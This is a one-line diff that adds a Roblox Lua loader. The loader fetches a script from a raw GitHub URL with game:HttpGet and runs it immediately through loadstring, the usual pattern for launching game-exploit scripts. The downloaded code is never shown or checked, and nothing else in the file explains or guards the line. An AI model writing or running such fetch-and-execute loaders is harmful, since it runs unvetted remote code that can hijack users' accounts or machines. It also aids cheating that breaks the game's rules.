@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/VoidScripter/SlavicGarage/main/The%20Main%20Script")))()
